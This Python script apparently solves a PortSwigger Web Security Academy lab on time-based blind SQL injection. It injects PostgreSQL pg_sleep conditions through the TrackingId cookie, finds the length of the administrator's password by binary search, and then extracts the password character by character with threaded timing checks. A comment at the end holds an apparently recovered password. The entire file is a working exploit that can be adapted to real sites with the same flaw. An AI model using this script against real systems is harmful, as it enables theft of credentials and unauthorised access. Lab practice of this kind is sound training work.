import string
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

LAB_URL = 'https://0a5c0037043e22768258bfef0010005d.web-security-academy.net/'

FILTERS = 'filter?category=Gifts'
ALPHABET = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
TRACK_ID = "hboNezi42tY735cC"
THRESHOLD = 2.7  # seconds
SLEEP_SECONDS = 4
MAX_WORKERS = 5
REQUEST_TIMEOUT = 10


def is_valid_response(res: requests.Response, threshold = THRESHOLD):
    return res.elapsed.total_seconds() >= (threshold - 0.15)


def get_query_with_condition(condition: str, sleep_seconds: int = SLEEP_SECONDS):
    return f"||(SELECT CASE WHEN ({condition}) THEN pg_sleep({sleep_seconds}) ELSE pg_sleep(0) END)--"

def ping() -> bool:
    with requests.session() as session:
        SQL_CONDITION = "1=1"
        
        res = session.get(LAB_URL + FILTERS, cookies={
            'TrackingId': f"{TRACK_ID}' {get_query_with_condition(SQL_CONDITION)}"
        }, timeout=REQUEST_TIMEOUT)

        if  is_valid_response(res):
            print("Tracking ID Recognized!\n")
            return True
            
        return False

    
def determine_length():
    with requests.session() as session:
        start = 1
        end = 50
        length = None
        
        while start <= end:
            mid = (start + end) // 2
            SQL_CONDITION = f"(SELECT length(password) FROM users WHERE username = 'administrator') > {mid}"
            
            res = session.get(LAB_URL + FILTERS, cookies={
                'TrackingId': f"{TRACK_ID}' {get_query_with_condition(SQL_CONDITION)}"
            }, timeout=REQUEST_TIMEOUT)
            
            if is_valid_response(res):
                print(f"Password length > {mid}")
                start = mid + 1
            else:
                print(f"Password length <= {mid}")
                length = mid
                end = mid - 1
        
        print(f"Password length: {length}")
        return length
            
def check_letter_for_position(session: requests.Session, cur: int, letter: str):
    """Check if a letter matches at a given position"""
    try:
        SQL_CONDITION = f"SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {cur}, 1) = '{letter}'"
        for _ in range(2):
            res = session.get(LAB_URL + FILTERS, cookies={
                'TrackingId': f"{TRACK_ID}' {get_query_with_condition(SQL_CONDITION)}"
            }, timeout=REQUEST_TIMEOUT)

            if is_valid_response(res):
                return letter, True
        return letter, False
    except Exception as e:
        print(f"Error: {e}")
        return letter, False

def crack_text_pwd(length: int):
    with requests.session() as session:
        result: list[str] = list()
        
        while len(result) < length:
            cur = len(result) + 1
            print(f"\nSearching position {cur}...")
            
            found_letter = None
            
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                futures = {
                    executor.submit(check_letter_for_position, session, cur, letter): letter 
                    for letter in ALPHABET
                }
                
                for future in as_completed(futures):
                    letter, is_match = future.result()
                    
                    if is_match:
                        print(f"✓ {letter}", end=" ", flush=True)
                        found_letter = letter
                        [f.cancel() for f in futures]
                        break
                    
                    print(f"✗ {letter}", end=" ", flush=True)
            
            if found_letter:
                print(f"\n✓ Found: {found_letter} at position {cur}")
                result.append(found_letter)
                continue
            
            print(f"\n✗ Warning: No letter found for position {cur}")
            break
        
        print(f"\n\nPassword: {''.join(result)}")
        return ''.join(result)
            
   
if __name__ == '__main__':
    if not ping():
        print("Invalid Tracking ID, please refresh before attempting: ")
        exit()
        
    length = determine_length()
    crack_text_pwd(length)
    # n892y38jnw32ou3p6tjj
    